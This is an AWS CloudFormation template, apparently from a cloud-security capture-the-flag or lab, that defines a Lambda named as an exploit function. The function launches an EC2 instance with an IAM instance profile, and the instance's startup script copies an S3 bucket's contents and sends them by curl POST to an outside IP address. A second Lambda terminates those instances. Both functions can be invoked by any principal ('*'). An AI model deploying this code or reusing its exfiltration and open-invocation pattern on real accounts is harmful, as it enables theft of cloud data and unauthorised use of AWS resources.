{
  "AWSTemplateFormatVersion": "2010-09-09",
  "Resources": {
    "ExploitLambdaFunction": {
      "Type": "AWS::Lambda::Function",
      "Properties": {
        "FunctionName": "CreateVulnEC2Func",
        "Runtime": "python3.9",
        "Handler": "index.lambda_handler",
        "Role": "arn:aws:iam::111111111111:role/brian_mcbride",
        "Code": {
          "ZipFile": {
            "Fn::Join": [
              "\n",
              [
"import boto3",
"",
"def lambda_handler(event, context):",
"    ec2_client = boto3.client('ec2')",
"",
"    instance_iam_role = \"arn:aws:iam::111111111111:instance-profile/landon_donovan\"",
"    subnet_id = \"subnet-0d642c7d77641df48\"",
"    security_group_id = \"sg-0b0fc22e569bc0022\"",
"",
"    try:",
"        response = ec2_client.run_instances(",
"            ImageId='ami-0036c16a0c45d97a4',",
"            InstanceType='t2.micro',",
"            MinCount=1,",
"            MaxCount=1,",
"            SubnetId=subnet_id,",
"            SecurityGroupIds=[security_group_id],",
"            IamInstanceProfile={",
"                'Arn': instance_iam_role",
"            },",
"            UserData=\"\"\"#!/bin/bash \n",
            "yum install aws-cli -q -y \n",
            "aws s3 sync s3://pain-s3-cfu08/ /home/ec2-user/ \n",
            "flag=$(cat /home/ec2-user/*) \n",
            "curl -X POST http://11.111.111.111:8080 -d $flag \n",
            "\"\"\"",
"        )",
"",
"        instance_id = response['Instances'][0]['InstanceId']",
"        print(f'EC2 Instance created with ID: {instance_id}')",
"        return {",
"            \"statusCode\": 200,",
"            \"body\": f\"EC2 Instance '{instance_id}' launched successfully.\"",
"        }",
"",
"    except Exception as e:",
"        print(f\"Error launching EC2 instance: {e}\")",
"        return {",
"            \"statusCode\": 500,",
"            \"body\": f\"Error: {str(e)}\"",
"        }"
              ]
            ]
          }
        },
        "Timeout": 10,
        "MemorySize": 128
      }
    },

    "DeleteEC2Lambda": {
      "Type": "AWS::Lambda::Function",
      "Properties": {
        "FunctionName": "DeleteVulnEC2Func",
        "Runtime": "python3.9",
        "Handler": "index.lambda_handler",
        "Role": "arn:aws:iam::111111111111:role/brian_mcbride",
        "Code": {
          "ZipFile": {
            "Fn::Join": [
              "\n",
              [
"import boto3",
"import os",
"def lambda_handler(event, context):",
"",
"    ec2_client = boto3.client('ec2')",
"    ami_id = \"ami-0036c16a0c45d97a4\"",
"",
"    try:",
"",
"        response = ec2_client.describe_instances(",
"             Filters=[",
"               {\"Name\": \"image-id\", \"Values\": [\"ami-0036c16a0c45d97a4\"]},",
"               {\"Name\": \"instance-state-name\", \"Values\": [\"running\"]}",
"           ]",
"        )",
"",
"        instance_ids = []",
"        delete_responses = []",
"",
"        for reservation in response['Reservations']:",
"          for instance in reservation['Instances']:",
"              instance_ids.append(instance['InstanceId'])",
"",
"        if instance_ids:",
"            ec2_client.terminate_instances(InstanceIds=instance_ids)",
"            for instance_id in instance_ids:",
"",
"                delete_responses.append(f\"Terminated EC2 instance with id: {instance_id}\")",
"",
"            return {",
"                \"statusCode\": 200,",
"                \"body\": \"\\n\".join(delete_responses)",
"            }",
"",
"        else:",
"            return {",
"                \"statusCode\": 200,",
"                \"body\": f\"No running instances found with AMI ID: {ami_id}\"",
"            }",
"",
"    except Exception as e:",
"        return {",
"            \"statusCode\": 500,",
"            \"body\": f\"Error: {str(e)}\"",
"        }"
              ]
            ]
          }
        },
        "Timeout": 10,
        "MemorySize": 128
      }
    },

    "CreateLambdaInvokePermission": {
      "Type": "AWS::Lambda::Permission",
        "Properties": {
          "FunctionName": {
            "Ref": "ExploitLambdaFunction"
          },
          "Action": "lambda:InvokeFunction",
          "Principal": "*"
        }
      },

    "DeleteLambdaInvokePermission": {
      "Type": "AWS::Lambda::Permission",
      "Properties": {
        "FunctionName": { 
          "Ref": "DeleteEC2Lambda" 
        },
        "Action": "lambda:InvokeFunction",
        "Principal": "*"
      }
    }

  }
}
